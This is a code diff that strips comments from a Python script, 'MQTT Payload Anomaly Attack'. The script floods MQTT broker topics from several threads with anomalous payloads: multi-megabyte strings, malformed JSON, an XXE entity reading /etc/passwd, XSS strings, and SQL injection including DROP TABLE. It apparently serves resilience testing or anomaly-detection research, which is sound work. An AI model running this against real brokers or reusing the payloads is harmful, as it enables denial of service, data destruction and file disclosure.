@@ -1,5 +1,3 @@
-"""MQTT Payload Anomaly Attack - sends malformed or anomalous payloads to test broker/subscriber resilience."""
-
 import argparse
 import csv
 import json
@@ -12,7 +10,6 @@ from datetime import datetime, timezone
 
 import paho.mqtt.client as mqtt
 
-
 class PayloadAnomalyAttack:
     def __init__(self, args):
         self.args = args
@@ -21,7 +18,6 @@ class PayloadAnomalyAttack:
         self.log_lock = threading.Lock()
         self.sent_count = 0
         
-        # Different types of anomalous payloads
         self.anomaly_types = [
             "oversized_payload",
             "malformed_json",
@@ -64,15 +60,12 @@ class PayloadAnomalyAttack:
             ])
 
     def generate_anomalous_payload(self, anomaly_type):
-        """Generate different types of anomalous payloads"""
         
         if anomaly_type == "oversized_payload":
-            # Generate extremely large payload (1MB+)
-            size = random.randint(1024*1024, 5*1024*1024)  # 1-5MB
+            size = random.randint(1024*1024, 5*1024*1024)
             return "A" * size
             
         elif anomaly_type == "malformed_json":
-            # Various malformed JSON structures
             malformed_jsons = [
                 '{"key": value}',  # missing quotes
                 '{"key": "value",}',  # trailing comma
@@ -85,11 +78,9 @@ class PayloadAnomalyAttack:
             return random.choice(malformed_jsons)
             
         elif anomaly_type == "binary_data":
-            # Random binary data
             return bytes([random.randint(0, 255) for _ in range(random.randint(100, 1000))])
             
         elif anomaly_type == "xml_injection":
-            # XML/XXE injection attempts
             xml_payloads = [
                 '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
                 '<script>alert("XSS")</script>',
@@ -98,7 +89,6 @@ class PayloadAnomalyAttack:
             return random.choice(xml_payloads)
             
         elif anomaly_type == "sql_injection":
-            # SQL injection payloads
             sql_payloads = [
                 "'; DROP TABLE users; --",
                 "' OR '1'='1",
@@ -108,7 +98,6 @@ class PayloadAnomalyAttack:
             return json.dumps({"value": random.choice(sql_payloads)})
             
         elif anomaly_type == "script_injection":
-            # Script injection payloads
             script_payloads = [
                 "<script>alert('XSS')</script>",
                 "javascript:alert('XSS')",
@@ -119,11 +108,9 @@ class PayloadAnomalyAttack:
             return json.dumps({"data": random.choice(script_payloads)})
             
         elif anomaly_type == "null_bytes":
-            # Null byte injection
             return f"normal_data\x00hidden_data_{random.randint(1, 1000)}"
             
         elif anomaly_type == "unicode_overflow":
-            # Unicode overflow attempts
             unicode_chars = [
                 "\u0000" * 1000,  # null chars
                 "\uFFFF" * 500,   # max unicode
@@ -133,15 +120,13 @@ class PayloadAnomalyAttack:
             return random.choice(unicode_chars)
             
         elif anomaly_type == "control_chars":
-            # Control character injection
-            control_chars = [chr(i) for i in range(32)]  # ASCII control chars
+            control_chars = [chr(i) for i in range(32)]
             payload = "normal_text_"
             for _ in range(50):
                 payload += random.choice(control_chars)
             return payload
             
         elif anomaly_type == "schema_violation":
-            # Violate expected IoT data schemas
             violation_payloads = [
                 {"temperature": "hot"},  # string instead of number
                 {"humidity": -50},       # invalid range
@@ -154,14 +139,12 @@ class PayloadAnomalyAttack:
         return "default_anomaly_payload"
 
     def attack_worker(self, worker_id):
-        """Worker thread for payload anomaly attack"""
         client_id = f"{self.args.client_prefix}_{worker_id:03d}"
         client = mqtt.Client(client_id=client_id, clean_session=True)
         
         if self.args.username:
             client.username_pw_set(self.args.username, self.args.password)
 
-        # Connect to broker
         connected = False
         while not connected and not self.stop_event.is_set():
             try:
@@ -176,21 +159,17 @@ class PayloadAnomalyAttack:
         if not connected:
             return
 
-        # Attack loop
         attack_interval = 1.0 / self.args.attack_rate if self.args.attack_rate > 0 else 1.0
         
         try:
             while not self.stop_event.is_set():
-                # Choose random anomaly type and topic
                 anomaly_type = random.choice(self.anomaly_types)
                 topic = random.choice(self.args.topics)
                 
-                # Generate anomalous payload
                 try:
                     payload = self.generate_anomalous_payload(anomaly_type)
                     payload_size = len(str(payload)) if isinstance(payload, str) else len(payload)
                     
-                    # Publish anomalous payload
                     result = client.publish(topic, payload, qos=self.args.qos)
                     
                     if result.rc == mqtt.MQTT_ERR_SUCCESS:
@@ -217,14 +196,12 @@ class PayloadAnomalyAttack:
             print(f"[{client_id}] Disconnected")
 
     def run(self):
-        """Start the payload anomaly attack"""
         print(f"Starting payload anomaly attack with {self.args.workers} workers")
         print(f"Target: {self.args.broker}:{self.args.port}")
         print(f"Topics: {self.args.topics}")
         print(f"Attack rate: {self.args.attack_rate} msgs/sec per worker")
         print(f"Anomaly types: {', '.join(self.anomaly_types)}")
         
-        # Start worker threads
         threads = []
         for i in range(self.args.workers):
             thread = threading.Thread(target=self.attack_worker, args=(i,))
@@ -233,19 +210,16 @@ class PayloadAnomalyAttack:
             threads.append(thread)
         
         try:
-            # Keep main thread alive
             while True:
                 time.sleep(1)
         except KeyboardInterrupt:
             print("\nStopping attack...")
             self.stop_event.set()
             
-            # Wait for threads to finish
             for thread in threads:
                 thread.join(timeout=5)
             
             print(f"Attack completed. Total anomalous payloads sent: {self.sent_count}")
-
 
 def main():
     parser = argparse.ArgumentParser(description="MQTT Payload Anomaly Attack")
@@ -280,7 +254,6 @@ def main():
         attack.run()
     finally:
         attack.close()
-
 
 if __name__ == "__main__":
     main()
